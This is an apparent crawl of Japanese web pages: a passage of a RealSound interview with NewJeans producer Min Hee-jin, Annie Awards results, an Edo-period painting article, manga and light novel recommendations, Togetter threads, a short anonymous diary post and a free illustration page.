ですからすべての要素を分離して、コンセプトが重要だ、音楽が重要だ、メンバーが重要だ、マーケティングやビジネスが重要だ、といった比較論理は意味のないことだと感じます。それぞれ比較優位ではなく、互いが緊密に組み合わさっている関係だからです。繊細かつ緻密にそれぞれの領域を繋ぎ、実際に可視化して成果を出すということは、ブランディング以上の価値を含んでいると思います。

デビュー6カ月目に発表したNewJeans『OMG』の2曲ともビルボード「HOT 100」にチャートインしました。続いて発売されたNewJeans 2nd EP『Get Up』のタイトル曲3曲も同様です。「Ditto」、「OMG」はそれぞれ5週間と6週間、「Super Shy」は8週間チャートインしました。これといった海外PRやリミックスの発売なしに収めた成果なので、励みになります。

ーーNewJeansのメンバーとして、あの5人を選んだ理由とは？

ミン・ヒジン：理由はいくつかありますが、なにより5人の個性が極めて異なるということが挙げられます。グループ内で重複するポジションやイメージを作りたくありませんでした。不必要な競争構図やストレスを作りたくなかったからです。グループでの活動はチームワークが非常に重要です。全く異なる性格や個性の融合は個人個人に競争力があるという前提の下で、集団内に自然と自信を誘発させ、安定感を形成することができます。自発的にお互いの個性を尊重し、それぞれの魅力を自信を持ってアピールすることができる環境を生み出したかったのです。

ーーNewJeansのパフォーマンスやキャラクターについて、活動期間を通して新たに発見したグループの強みやメンバーの魅力はありますか？

ミン・ヒジン：たくさんあって説明が難しいですね（笑）。簡潔に述べるなら、NewJeansのメンバーたちの強みは、常にポジティブに学ぶ姿勢で仕事を楽しんでいるという点です。もちろんすべてが完璧ではなく、当然その過程には失敗もありますが、彼女たちは若くて純粋で才能に満ちあふれています！ プロジェクトごとに私達は新たな学びの道に進んでいるので、スポンジのようなメンバーたちの未来が非常に楽しみですね。

ーーNewJeansの楽曲・映像・ビジュアルから伝わる“親近感”や“等身大”な雰囲気は、どのような狙いを持ってデザインされたのでしょうか？

ミン・ヒジン：自然な雰囲気のグループができたらいいな、という望みがありました。それが時代の流れであり、従来のスタイルとの差別化の面でも正しいと思ったのです。私が追求する音楽の方向性にも合致します。日常の自然さを、作り出した物として具現化するということは容易ではありません。個性に対する理解はもちろん、実際にも最大限人為的でない条件を備えなければならないという、非常に細かくデリケートで神経を使うことだからです。インタビューでは少々難しい説明かもしれませんが、メンバーや私のためにも「コンセプトのためのコンセプト」を作りたくはありませんでした。

ーーNewJeansの独自性は、従来のK-POPファン層とは異なる人々も魅了しています。この状況は戦略的なものだったのか、もしくは偶発的なものだったのか、どちらでしょうか？

ミン・ヒジン：最初の曲のコンセプトを決めて、チームの方向性を作る時から念頭に置いていた点でした。私の長年の望みのひとつですが、常に大衆文化のシーンでもっと様々な音楽と表現が紹介されてほしいと願っています。実際にその一環としてNewJeansというグループを企画したので、私たちがチャレンジするすべてのことが、大衆にどのような嬉しいシグナルとして作用するのだろうと思いました。そうなってこそシーンがより発展的で新しい方向に動くと思いました。

ーー緻密な市場分析を行った上でプロデュースされている印象を受けます。ミン・ヒジンさんが市場分析において重要視しているのはどんな要素ですか？

ミン・ヒジン：仕事に対して緻密なタイプではありますが、それが市場分析には該当しません。私は市場に関する資料を集めて分析するのではなく、目に見えない洞察力を信頼します。市場にすでに明らかになったシグナルを集めて分析し反映することは、むしろ遅い歩みを作ると思います。破片を集めるより全体的な流れに集中します。大衆の普遍心理に基づき、時代的な流れとその行方に注目して大きな流れを掴んで、それを表現するにあたりディテールの要素として、トレンドの片鱗をあちこちに配置して活用します。場合によってはトレンドを完全に無視することさえあります。目標と方向性が明確で、結果物に完成度まで揃えば、トレンドを無視した方がむしろ創意に富むことが多いです。

ーーNewJeans 1st EP『New Jeans』は4曲で13分、NewJeans 2nd EP『Get Up』は6曲で14分と1曲1曲が非常に短いです。尺の短い楽曲は世界的なトレンドでもありますが、楽曲を短くするメリットをどのように捉えていますか？

ミン・ヒジン：ショートコンテンツを狙って短くするという推測が多いですが、私たちはそうではありません。曲ごとに展開や流れというものがありますが、その構成の中で自然に曲の長さが決まるタイプです。場合によっては多少ありきたりな展開に感じられるヴァースやブリッジなどが削除されたりしますが、それもまた曲の洗練された流れのためであったり、完成度を基準に決めるものですから、意図的に曲の長さを決めて作業したりオーダーするというようなプロセスはむしろなんだか異質に感じられます。Interludeトラックの場合、文字通り「間奏」として挿入されるトラックなので長さにこだわる意味がないように、曲ごとに異なる理由と基準で長さが決まります。これまで曲の完成度のほかに、意図的な理由でわざと長さを調整したりすることはありませんでした。
Title: ミン・ヒジン、NewJeansを成功に導いた異端の発想　「トレンドを無視した方がむしろ創意に富む」

Link: https://togetter.com/li/2316686
Content: 『孔雀王』や『お気楽忍者ハンゾー』も捨てがたいけど『忍たま』だったかな。でも忍者の本も読んでたからマジでわからん。

目次 陣と陳

学研まんが

孔雀王

忍たま

宇宙皇子

カルラ舞う

サイポリス

妖界ナビ・ルナ

東京バビロン

他にもいろいろ

ゲームからのヒトも

まさかのおもちゃ

伝承されたケースも 陣と陳

学研まんが
Title: 貴方の「臨兵闘者皆陣烈在前」はどこから？ 「孔雀王」「忍たま」「学研まんが ひみつシリーズ」「カルラ舞う」他バラけていく

Link: https://natalie.mu/eiga/news/561566
Content: アニメーション作品を対象とした第51回アニー賞が日本時間2月18日に発表され、スタジオジブリ作品「 君たちはどう生きるか」がキャラクターアニメーション賞（長編）と絵コンテ賞（長編）を受賞。「 スパイダーマン：アクロス・ザ・スパイダーバース」が長編アニメーション作品賞を含む7冠を獲得した。

「君たちはどう生きるか」は 宮崎駿による長編アニメーション。第2次世界大戦下の日本、母を火事で亡くした少年が不気味な青サギに導かれ、生と死が入り交じる世界を訪れるさまが描かれる。英題は「The Boy and the Heron」で、英語版では クリスチャン・ベール、 デイヴ・バウティスタ、 ジェンマ・チャン、 ウィレム・デフォーらが声優として参加した。

「スパイダーマン：スパイダーバース」の続編にあたる「スパイダーマン：アクロス・ザ・スパイダーバース」は、マルチバースを自由に行き来できるようになった世界を舞台とした物語。長編アニメーション作品賞のほか、アニメーション効果賞（長編）、キャラクターデザイン賞（長編）、監督賞（長編）などに輝き、最多受賞作品となった。

なお、白砂由佳がNetflixシリーズ「BLUE EYE SAMURAI/ブルーアイ・サムライ」で編集賞（テレビ / メディア）を受賞。同作は6冠を達成している。

なお日本からは 新海誠監督作「 すずめの戸締まり」が長編アニメーション作品賞、アニメーション効果賞（長編）、キャラクターアニメーション賞（長編）など7部門でノミネートされていた。また「君たちはどう生きるか」で音楽賞（長編）にノミネートされていた 久石譲は、生涯またはキャリアにおける貢献に対して贈られるウィンザー・マッケイ賞を獲得。主な受賞結果は下記の通りだ。

※宮崎駿の崎は立つ崎（たつさき）が正式表記

第51回アニー賞 主要部門受賞結果

長編アニメーション作品賞

「スパイダーマン：アクロス・ザ・スパイダーバース」

長編インディペンデント作品賞

「 ロボット・ドリームズ」

短編アニメーション作品賞

「WAR IS OVER! Inspired by the Music of John & Yoko（原題）」

リミテッドシリーズ作品賞

「Kizazi Moto：ジェネレーション・ファイア fromアフリカ」

アニメーション効果賞（長編）

「スパイダーマン：アクロス・ザ・スパイダーバース」

キャラクターアニメーション賞（長編）

「君たちはどう生きるか」

キャラクターアニメーション賞（実写）

「 ガーディアンズ・オブ・ギャラクシー：VOLUME 3」

キャラクターデザイン賞（長編）

「スパイダーマン：アクロス・ザ・スパイダーバース」

監督賞（長編）

ホアキン・ドス・サントス、ケンプ・パワーズ、ジャスティン・K・トンプソン「スパイダーマン：アクロス・ザ・スパイダーバース」

音楽賞（長編）

ダニエル・ペンバートン、メトロ・ブーミン「スパイダーマン：アクロス・ザ・スパイダーバース」

美術賞（テレビ / メディア）

トビー・ウィルソン、ジェームズ・ウィルソン、エミール・ミテフ「BLUE EYE SAMURAI/ブルーアイ・サムライ」

美術賞（長編）

パトリック・オキーフ、ディーン・ゴードン「スパイダーマン：アクロス・ザ・スパイダーバース」

絵コンテ賞（長編）

「君たちはどう生きるか」

声優賞（長編）

クロエ・グレース・モレッツ「ニモーナ」

脚本賞（長編）

ロバート・L・ベアード、ロイド・テイラー「ニモーナ」

編集賞（テレビ / メディア）

白砂由佳「BLUE EYE SAMURAI/ブルーアイ・サムライ」

編集賞（長編）

「スパイダーマン：アクロス・ザ・スパイダーバース」編集チーム「スパイダーマン：アクロス・ザ・スパイダーバース」

読者の反応 307
Title: 「スパイダーバース」アニー賞で最多受賞、「君たちはどう生きるか」は2冠

Link: https://anond.hatelabo.jp/20240218130458
Content: 本当にラジオだけが心の支えだ

でもジェーン・スーさんのラジオの想定される聴取者からは自分は外れてしまった

○○の方、○○の方、と呼びかける部分は、本来はとても包容力のある優しい呼びかけなのだと思うが、

でも結局「がんばってない人」はそこに含まれないはずで、だからがんばってない自分は死んだ方がいいと思ってしまう

爆笑問題のラジオしか楽しく聞けなくなりつつある

ツイートシェア
Title: 本当にラジオだけが心の支えだ でもジェーン・スーさんのラジオの想定され..

Link: https://realsound.jp/2024/02/post-1574758_2.html
Content: 自分だけの感覚が通じる可能性も世の中に存在する

ーーこれまでミン・ヒジンさんは、様々なカルチャーを時代・文脈を超えて融合させることで、世間が驚くような作品を生み出してきたと感じています。今注目しているカルチャーや音楽はどんなものですか？

ミン・ヒジン：そうですね……私が思うに「注目される何か」は概ね本能的な直観に自信が加わって完成度が出てきたと思います。したがって、ある特定のジャンルや文化に影響を受けることよりは、好みに基づいた多様な文化的ソースをどのように再解釈、再構成し、新しい手段として完成度の高い表現をするのかに集中する方だと言えるでしょう。そのため、常にすべてのことに対して開かれていて関心が高かったりもしますが、逆にすべてに関心を失ったりもします。

ーープロデューサーとしてのルーツを教えてください。

ミン・ヒジン：幼い頃の私は音楽、映画、本が特に好きでした。特に音楽は幼い頃から、特定のジャンルに限られない自分だけのスタイルというものが明確にありました。例えばFrancis Lai、 Antonio Carlos Jobim、 Bruno Nicolaiなどです。それぞれフランス、ブラジル、イタリアのミュージシャンなんですが、特に様々な第三世界の音楽に夢中で、熱心に探して聴いていた記憶があります。その中でもAstrud Gilbertoの「The girl from ipanema」は私の人生最高の曲とも言えますが、楽しくもあり、仕事においてもとても大きな勇気になってくれた曲です。1964年に発表された「The girl from ipanema」は、当時ビルボード「HOT 100」で5位、アルバムチャートで96週間ランクインし、歴史上最も売れたジャズアルバムとして記録され、グラミー賞でも「今年のレコード」を受賞しました。ジャズという主流でないジャンルが大衆的に大きな異変を起こしたという事実が、私のビジョンにも触れていて、暗黙的に大きな力になりました。素敵な音楽はジャンルや時代を問わず、いつでも愛されることができるという確信を得ることができたのです。Astrud GilbertoやDusty Springfieldなどの淡泊で雰囲気のある歌唱スタイルを好む傾向が、グループのメンバーを選抜、構成する上でもある程度適用されていたような気もします。

13歳の頃だったと思うのですが、ラジオで偶然耳にした歌をどうしても探したかったことがありました。ところが当時はインターネットやスマートフォンがある時代ではなかったので、歌を探す方法がなく、あてもなく近所のレコードショップに駆け込み、恥ずかしさを押し切って店員さんの前でしゃがみ込んで歌を歌いました。もちろん歌詞も知らなかったし、聴いた記憶をたどって適当に口ずさんだのですが、そのレコードショップの店員さんが見事に探し当ててくれて、そうやって知ったミュージシャンがEarth, Wind & Fireでした。その店員さんがEarth, Wind & Fireの数多くのアルバムの中から、六本木ヴェルファーレ公演のライブアルバムを選んでくれたんですよ。そのライブアルバムでEarth, Wind & Fireというバンドに初めて接したんです。今でもEarth, Wind & Fireのすべてのアルバムの中で、あの時のヴェルファーレのライブアルバムが一番好きです。カセットテープが伸びるほど聴いて、そのアルバムの全曲すべてのアドリブを真似できるほどでした。私はもともときれいにレコーディングされたスタイルが好きな方ですが、あのライブアルバムがあまりにも印象的だったために、後日正式レコーディングバージョンのアルバムを聴いた時には少しがっかりしたほどでした（笑）。幼い頃に刺激を受けた様々なことが私の人生と仕事に影響を及ぼしたことはあまりにも明らかです。

ーー2ステップやドラムンベースをはじめ、NewJeanの楽曲には多彩なリズムアプローチが見られます。それらがここまでリスナーの熱狂を呼ぶと予想していましたか？

ミン・ヒジン：NewJeansのデビュー前は、誰も私たちの「多様なアプローチ」について予想することができませんでした。おそらく「期待」よりは、既存のものとは違う見慣れない異質感を憂慮する声を多く聞かなければいけませんでした。ところが大衆的に成功すると、その心配が歓迎の声に変わりました。結果的に成功がトレンドを牽引したわけですが、NewJeansが成功するかどうかについての多くの予測が虚像だったように、今後のトレンドの変化を予測するということも、どれほど意味のあることなのかわかりません。成功に牽引されたトレンドに従うよりは、持続的に新しい個性が市場に多様に広がることを願います。 NewJeansの成功が証明するシグナルはひとつです。「予測とは違う、自分だけの感覚が通じる可能性も世の中に存在する」ということ。

ーーダンスにおいても、ガールズクラッシュ的な攻撃性やクールさではなく、無邪気なかわいさやメンバーのナチュラルな表情を引き出そうという意図が感じられます。振り付けは、どんなところにこだわりを持っていますか？

ミン・ヒジン：私は総じて人間味が感じられる自然な動きが好きです。また、極端に女性らしい動作よりは中性的で淡泊な動きを好み、曲と相まって総合的な心地よさを生み出すことができるスタイルを追求します。同じダンスを踊っても人によって表現や雰囲気は変わるので、スキルに重点を置いた定型化された動作を磨かせるより、実際にメンバーたちが音楽を感じながらステージごと楽しめる形を作りたいと思いました。

ーーNewJeansは韓国におけるアワードでの複数受賞をはじめ、NewJeans 2nd EP『Get Up』が全米アルバムチャート（Billboard 200）で首位を記録、『Billboard Music Awards: 2023（BBMAs）』にて「Top Global K-Pop Artist」受賞、『2023 MTV Video Music Awards』ノミネートなど、輝かしい記録を次々と残しています。こういったアワードや記録を振り返った際に、NewJeansが世界的に高く評価された理由はどんなところにあると考えますか？

ミン・ヒジン：ある特定の集団をターゲットにしたというより、普遍的な感情に集中したからだと思います。私はいつも「私が必ず欲しい何かは、他の人々にとっても必ず欲しい何かであるだろう」という前提で仕事をする方です。

ーー日本デビューや単独公演などを心待ちにしているファンも多いのですが、NewJeansに対して我々はどんなことを期待していれば良いでしょうか？

ミン・ヒジン：大いに期待してくださってもいいと思います。

※記事初出時、本文に誤りがありました。以下訂正の上、お詫び申し上げます。

（2024年2月19日12:12、リアルサウンド編集部）

誤：後日正式レコーディングバージョンのアルバムを聞いた時にはとてもがっかりしたものでした。

正：あのライブアルバムがあまりにも印象的だったために、後日正式レコーディングバージョンのアルバムを聴いた時には少しがっかりしたほどでした（笑）。
Title: ミン・ヒジン、NewJeansを成功に導いた異端の発想　「トレンドを無視した方がむしろ創意に富む」

Link: https://togetter.com/li/2316608
Content: 芝居をごまかすなと言われ、なぜか小学生の時に車で父が見てたエッチな動画が大音量で流れてしまった事があって、父が慌てて私を車から降ろし「この車 自爆しようとして叫んでる 逃げろ」と車のせいにしてごまかしてた事を思い出しました。
Title: 女優・片岡凛さんが「芝居をごまかすな」と言われ子供の頃に車で父がオトナな動画を大音量で流す失態をごまかしたことを思い出した話…父も反応

Link: https://nordot.app/1127496635790934959
Content: 写真技術がもたらされる前の江戸時代。日本各地の庶民の実際の姿はどんなものだったのか？ドイツ・ミュンヘンの五大陸博物館が、収蔵する約２百年前の日本人画家の絵の画像使用を許可した。長崎・出島のオランダ商館に駐在したドイツ人医師シーボルトが、お抱えの町絵師・川原慶賀に発注したものだ。

葛飾北斎ら同時代の有名な浮世絵師たちの画風とは全く異なり、慶賀の人物画は西洋画の影響を受けており写実的だ。

長崎純心大で長らくシーボルトや日欧文化交流を研究している宮坂正英客員教授（６９）は「今とは別世界だった江戸時代を正確に写した貴重な資料」と評価している。（共同通信＝下江祐成）

宮坂正英氏＝２０２３年１２月、長崎市

キツネ面の男（ミュンヘンの五大陸博物館所蔵。朝日新聞出版提供）

▽忘れ去られた多様な庶民の姿

慶賀は江戸時代末期の長崎の町絵師で、鎖国下、シーボルトらによる江戸参府に同行して、道中さまざまな人物を描写した。

その絵を見て、圧倒されるのは多様性にあふれる庶民の姿だ。近年の日本史研究では士農工商という固定された身分制度は否定されており、江戸時代が多様な身分や宗教が混在した社会だったことが分かっている。

全身白ギツネのような格好で歩く「キツネ面の男」は、多様性の典型例と言える。

稲荷神社に参詣し、餌の少ない寒中に油揚げなどをやぶに置いて歩く「寒施行」の姿を描いたものだ。寒施行の風習は、京都や大阪を中心とした上方や西日本で広く見られたという。

鯨取りの漁師（五大陸博物館所蔵。朝日新聞出版提供）

紀州や土佐のほか、長崎や佐賀などで盛んに行われていた鯨取りの漁師の姿も残る。冬の海で巨大な鯨に飛び乗って直接、とどめを刺す「羽差」と呼ばれた花形漁師の姿だ。鯨に海中に引きずり込まれたり尾びれの強烈な一撃を受けたりする命がけの役目だった。

特徴的な長いまげは、海中で力尽きた際に、仲間がつかんで引き上げやすいように伸ばしていたと伝えられている。

慶賀の人物画は過去、出版社が発行したが、増刷はなく現在、再販予定はない。宮坂氏は、五大陸博物館でも公開していないと説明し、この画像で「明治以降、西洋化された私たちが忘れ去った江戸時代の日本人の姿を見てもらえたら」と話す。

汐汲みの娘（五大陸博物館所蔵。朝日新聞出版提供）

▽消えゆく日本文化を危惧

シーボルトがオランダ政府から研究費を支給されていたのは、動植物など自然科学分野だ。なぜ仕事目的以外の庶民の姿を描かせたのか―。

宮坂氏は、シーボルトが家族に宛てた未出版の手紙にある「この文明は早晩なくなるので記録しないといけない」との記述に注目している。

産業革命を経て圧倒的となった西洋文明の流入が迫っていた当時。シーボルトは、日本独自の文化がなくなってしまうことを危惧し、慶賀に日本人のありのままの姿を描かせたとみられている。

般若と恋文の刺青を入れた川越人足（五大陸博物館所蔵。朝日新聞出版提供）

当時の有名な浮世絵師たちは、江戸の歌舞伎役者や美人画は多く残したものの、さまざまななりわいの庶民にフォーカスを当てて描いたものはあまり見られない。

鎖国下、西洋への唯一の窓口だった長崎・出島に自由に出入りでき、写実的な技法を習得していた慶賀がいなければ、普通の庶民の姿がこれほどビビッドな形で残ることはなかったと言えそうだ。

一介の町絵師だった慶賀の晩年は、不遇なものだった。妻と娘２人に先立たれ、そばにいた可能性があるのは画家の息子１人だったようだ。

長崎奉行所による判決記録「犯科帳」に、国外に日本地図などを持ち出そうとしたシーボルト事件に連座した「罪人」としての慶賀の記録が残っている。

外国人スパイに協力した危険人物―。こんな冷ややかな目で見られながら、ひっそりとこの世を去ったとみられている。
Title: 江戸時代には「全身白ギツネ男」が実在した　シーボルトお抱え絵師が残した２００年前の日本は「別世界」　ドイツの博物館収蔵の画像で判明 ｜ 47NEWS

Link: https://shonenjumpplus.com/episode/9324074615349361721
Content: 言葉のないところ

上田さかひら

主人公の古賀は、噂の絶えない圧倒的美人・島井なつきを描いていた。言葉にできない何かを表すように。「私って、もっと綺麗やない？」そう言われ振り返ると、そこには島井なつき本人がいて――!?
Title: 言葉のないところ - 上田さかひら | 少年ジャンプ＋

Link: https://soredoko.jp/entry/2024/02/19/103000
Content: 紹介してくださるのは、漫画をこよなく愛するライター、藤堂真衣さんです。

そこでソレドコでは、季節やイベントにからめたさまざまなテーマごとに「今読むべき作品」を紹介していきます。 そうそうこういうのが読みたかったの……！ という作品がきっと見つかるはず。

とはいえ、すでに巻数を重ねている作品を今から読み始めるのは大変だし、新作も数が多過ぎて選ぶのが大変だし 。「自分の好みに合う作品」をどう選ぶか は悩ましいところです。

仕事終わりのほっと一息つく時間に、そして休日のくつろぎ時間に、 ゆっくりと漫画を読みたい という方も少なくないでしょう。

今日の推し漫画はコレ！：『正反対な君と僕』

今回のテーマ：ソレドコ編集部より

年末年始に積ん読の漫画を全部読んでしまい、今すぐ読める漫画がありません……。年始から仕事を頑張った自分を労ってあげるためにも安心して読める作品がありがたいのですが……。

📗

こんにちは！ ライターの藤堂真衣と申します。昔から漫画やアニメが大好きで、大人になった今も少しの暇を見つけては漫画を読み漁る日々を送っています。

本連載では、そんな私がこれまでに読んだ漫画のなかから季節やその時々のテーマに合ったもの、さらに注目が集まる話題作など「ぜひ今読んでほしい！」と思う“推し漫画”を紹介します。

初回のテーマは「安心して読める作品」ということで、阿賀沢紅茶先生の『正反対な君と僕』を選んでみました。電子書籍配信サイト「コミックシーモア」が1月に発表した「みんなが選ぶ!!電子コミック大賞2024」で男性部門賞を受賞した話題作です。

陽キャ女子と物静か男子の“ピュア過ぎる恋”

突然ですが、皆さまが漫画に求めるものって、何でしょうか。

日常生活では味わえないスリルや冒険、現実には起こらないであろうドキドキな恋！ も漫画の醍醐味ですが、『正反対な君と僕』は、そんなジェットコースター的な展開に少し疲れた人へおすすめしたい、ストレスフリーな作品なんです！

まず、この作品を貫くテーマは、高校で陽キャグループに属する女子・鈴木と、その隣の席に座る物静かなメガネ男子・谷くんの、まさに正反対な二人の「ピュア過ぎる」恋。

男子があまり興味を持たないようなテーマ（例えば、マスカラをどこのメーカーのものにするかとか）について「谷くんはどう思う？」と話を振り、案の定「僕が知るわけないでしょ」と返され「塩対応～！」と茶化して楽しむ……と見せかけて、話を振った張本人の鈴木は谷くんのことがめちゃくちゃ好きだという意外なモノローグから物語はスタートします。

鈴木は陽キャグループにいるものの、本当は周囲のことが気になって、空気を読みながら「陽キャな自分」を演じてしまっているのがひそかなコンプレックス。対して谷くんは、これといって目立つタイプでもなく、友達も多くないけれど、誰に対しても態度を変えることがない。そこが「自分にないところ」だと感じた鈴木は谷くんに憧れ、惹かれている……という構図です。

忘れていた青春を思い出させてくれる

『正反対な君と僕』の何がいいって、とにかく鈴木と谷くんのピュアさ。そして、悪役不在の安心感！

私は残念なことに高校時代、彼氏がいなかったので、高校生の恋愛というものを想像でしか語れないのですが、「こんな高校生活を送りたかったな…！！」とニヤニヤしてしまうエピソードの連続です。

「一緒に帰る」だの「手をつなぐ」だの「名前で呼ぶ」だの、大人になると忘れてしまいがちな“恋愛のステップ”的なものを少しずつ踏ん……あれ？ 踏んでる？ 1話から何か進展してる？ ってくらいスローペースで歩んでいく二人の姿が、これまた忘れてしまっていた“青春”を思い出させてくれるんですよね（まぁ、オタ活に忙しくてそんな青春は送ってこなかったんだけど……）。

“いいやつ”ぞろいな陽キャたち

そして、単純にピュアなラブストーリーなのかと思いきや、谷くんを思うあまり暴走＆自爆しがちな鈴木のコミカルな振る舞い、それに対する友人の冷静なツッコミがほどよく挟まり、ラブコメ仕立てになっているんです！

友人たちのツッコミのおかげで、読んでて気恥ずかしくなる度合いも控えめ。

そもそも鈴木の友人は鈴木が谷くんのことを好きだと知っても「いいじゃん！」と応援してくれるほど“いいやつ”ぞろい（友人たちが主人公的なポジションになるエピソードもあります）。

だから、恋のライバルがケンカを売ってきたり、元カノが現れたり……などのハラハラする展開はなく、ストレスフリーに読めます。それでもなぜか毎話きちんと「盛り上がる」のが『正反対な君と僕』のスゴイところ。

いろいろなことに悩み、考える高校生たちの姿に、いつしかそのクラスに自分もいるような気持ちに……こんな高校生活送りたかった……！！（2回目）

📗

ちなみに、この作品は、少年ジャンプ＋（プラス）で配信されていて、2024年2月時点でコミックスが5巻まで発売中。さらに、書店員を中心とした選考委員が選ぶ「マンガ大賞2024」にもノミネートされています。

少年ジャンプ＋では試し読みも可能！

“正反対”のカップルが、友人たちに見守られながら、ドタバタしながらも絆を深めていく『正反対な君と僕』。心穏やかにキュンキュンしたい方はぜひ読んでみてくださいね！
Title: 全員“いいやつ”。こんな高校生活を送りたかった…と感じる極上ラブコメ『正反対な君と僕』 #ソレドコ - ソレドコ

Link: https://shonenjumpplus.com/episode/9324074615349343898
Content: 私の命を狙っているのではあるまいか？／2023年12月期JUMP新世界漫画賞

ナカタ

何気ない日常に蔓延る“命の危険”を常に意識する主人公。彼は自身を「心配性ではない」と語っているが…!?
Title: 私の命を狙っているのではあるまいか？／2023年12月期JUMP新世界漫画賞 - ナカタ | 少年ジャンプ＋

Link: https://realsound.jp/book/2024/02/post-1576623.html
Content: ファンタジア大賞、電撃小説大賞、スニーカー大賞はいずれも四半世紀超の歴史を誇るライトノベルの新人賞。『スパイ教室』『涼宮ハルヒの憂鬱』『ブギーポップは笑わない』といったヒット作を送り出し、人気作家を生み出してきた。この3つの賞でそれぞれに〈大賞〉を獲得した作品が2月に続けて刊行。その内容からは各賞を運営するファンタジア文庫、スニーカー文庫、電撃文庫といったレーベルが目指しているところや、今のラノベ読者を引きつけそうな要素が見えてくる。

2月1日に第28回スニーカー大賞〈大賞〉受賞作として凪『人類すべて俺の敵』（スニーカー文庫）が刊行され、2月10日に第30回電撃小説大賞〈大賞〉受賞作の夢見夕利『魔女に首輪は付けられない』（電撃文庫）が登場。2月20日に第36回ファンタジア大賞〈大賞〉受賞作として零余子『夏目漱石ファンタジア』（ファンタジア文庫）が発売となって、書店のラノベコーナーに新刊として〈大賞〉作品が同時に並ぶ。

電撃の〈大賞〉作品刊行は2月が恒例。これに昨年4月には受賞が決まっていたスニーカーの〈大賞〉作品刊行が追いつき、1月刊行が多かったファンタジア〈大賞〉作品の刊行が2月にずれ込んだことで同じ月の刊行が実現したようだ。ファンタジアの場合はあまりに突拍子もない内容の精査に時間がかかって、1ヶ月遅れたのかもしれない。

ファンタジア大賞は次の流行を生み出す

何しろファンタジアで〈大賞〉を受賞した『夏目漱石ファンタジア』は、タイトルにあるように主人公は夏目漱石だが、人気作家として名を馳せ、政府に反抗する組織のリーダーとなったという設定。伊豆の旅館に潜伏していた所を爆殺され、婚約者だったこともあった女性作家、樋口一葉の体に脳だけ移植されてしまう。蘇った夏目漱石は、神田女学院の教師をしながら正岡子規ら文豪たちの脳を奪って回る殺人鬼「ブレインイーター」を追うことになる。

1896年（明治29年）に24才で病死した樋口一葉だったが、肉体は星製薬を創業する実業家で、SF作家の星新一の父親でもある星一の助けで冷凍保存されていた。漱石が爆殺されて脳を移植されたのは1910年。手術を指揮したのは軍医でもあった森鴎外で、執刀したのはアメリカから呼び戻した野口英世といった具合に実在の偉人が続々と登場する。文豪たちの名前は受け継いでいるが、作品性を元にキャラクター化されている『文豪ストレイドッグス』の登場人物たちとは違う設定だ。

史実がベースにあるだけに、虚構をふくらませて面白くするにしても史実を大きく踏み外すことはできない。そこで近代文学とライトノベルに通じた成蹊大学の大橋崇行准教授に監修を仰いだ。こうした検討の成果として、文豪や偉人たちのいかにもな言動とふるまいが、驚きの展開をもたらす空前のストーリーを持った作品に仕上がった。

第1回ファンタジア大賞で神坂一『スレイヤーズ!』を準入選作として輩出し、五代ゆう『はじまりの骨の物語』など硬軟混ざったファンタジー作品を送り出してきたファンタジア大賞だが、第35回でははやりのVTuberをテーマにした朝依しると『VTuberのエンディング、買い取ります。』が〈大賞〉を獲得した。第32回の竹町『スパイ教室』は、美少女たちによる諜報戦というジャンルの興隆を、アニメ『プリンセス・プリンシパル』などと共に支えている。時代を捉えて次の流行を生み出すスタンスが今のファンタジア文庫であり、ファンタジア大賞にはあるのかもしれない。



尖った作品にスポットを当て続ける電撃小説大賞

『ソードアート・オンライン』の川原礫を『アクセル・ワールド』でまず世に送り出し、アニメ化が発表された菊石まれほ『ユア・フォルマ』や、人気シリーズとなりアニメ化もされた安里アサト『86-エイティ・シックス-』といったヒット作を最近も続々と出している電撃小説大賞。ハードであったりエッジが立っていたりする作品が並ぶ印象は、第30回の〈大賞〉受賞作となった『魔女に首輪は付けられない』でも踏襲されている。

貴族階級が独占していた魔法が大衆化したことで犯罪が急増。魔術犯罪捜査局が設立されて取り締まりに当たっていた。ローグ捜査官もそのひとりだったが、上司の命令で〈第六分署〉に送り込まれ、そこで災害級の損害をもたらしかねない異能力を持った〈魔女〉たちを使い、人から命を吸い取って老衰死させる〈奪命者〉を捕らえる任に就く。〈魔女〉たちは気に入らない上司を自殺に追い込むような厄介者たちばかり。それでもローグは〈人形鬼〉と呼ばれるミゼリアをはじめとした〈魔女〉たちをどうにか動かし、〈奪命者〉に迫っていく。

人間を害するようなら命を奪う〈首輪〉をはめられていても自由気ままな〈魔女〉たちのキャラクター性にまず惹かれ、それぞれが異なる能力を持った〈魔女〉たちのサポートも受けてローグが挑む事件の真相というミステリ的な展開に興味を誘われる。裏切りがあり逆転もあった先に感慨深いクライマックスが待っているストーリーも奥深い。

振り返れば、第28回の〈大賞〉受賞作となった白金透『姫騎士様のヒモ』も意外な設定が明らかにされ、タイトルにかけられた二重の含意が分かって驚かされた作品だった。第27回で〈大賞〉の『ユア・フォルマ』は、女性刑事と人間そっくりのロボット補助官がバディとなって電脳犯罪に挑むSF設定のミステリとして評判を呼んだ。転生からの大活躍なりラブコメなりが賑わうラノベの界隈で、尖った作品にスポットを当て続けるスタンスが残ったレーベルだ。
Title: ファンタジア、電撃小説、スニーカー……老舗ラノベ新人賞〈大賞〉受賞作がそろい踏み　各賞の傾向は？

Link: https://illustrator-factory.com/cute-vegetables/
Content: 「可愛い野菜のイラスト」は、キャベツや人参、じゃがいもなどの一般的な野菜を可愛いテイストで描いたイラストセットです！

白菜 かぼちゃ レタス キャベツ ブロッコリー なす じゃがいも たまねぎ トマト 大根 ごぼう とうもろこし きゅうり にんじん おくら にんにく しょうが ピーマン

上記18種類の野菜イラストを収録しています。

ダウンロード 421.57 KB 0 ダウンロード

イラストの使用用途について

このイラストは、野菜や食に関する広告やチラシ、ブログの挿絵など、

様々な用途にお役立ていただけます。

もちろん、無料かつ商用利用可能なフリー素材ですので、自由にご利用いただけます。

提供する素材データについて

提供する素材データは2つの形式があります。

ひとつは背景が透明な透過PNGデータ、

もうひとつはAdobe Illustrator（イラレ）などのソフトで編集可能なAI（ベクター）データです。

AIデータはAdobe Illustrator CS4以上でご利用いただけます。

上記ダウンロードボタンからダウンロードをお願いします。

png形式をご希望の場合は、お手数ですが下記画像を保存してお使いください。
Title: 可愛い野菜のイラストセット

Link: https://shonenjumpplus.com/episode/9324074615349361746
Content: まじょってる／2023年12月期JUMP新世界漫画賞

米倉朱鳥

女子高生・終猫ツヅラは実は魔女！ある日、突然男の子から告白されるも、その場に居合わせた父が烈火の如くブチギレてしまい…!?
Title: まじょってる／2023年12月期JUMP新世界漫画賞 - 米倉朱鳥 | 少年ジャンプ＋

Link: https://togetter.com/li/2316986
Content: ご当地コラボでちいかわが新撰組に入隊させられてますが…

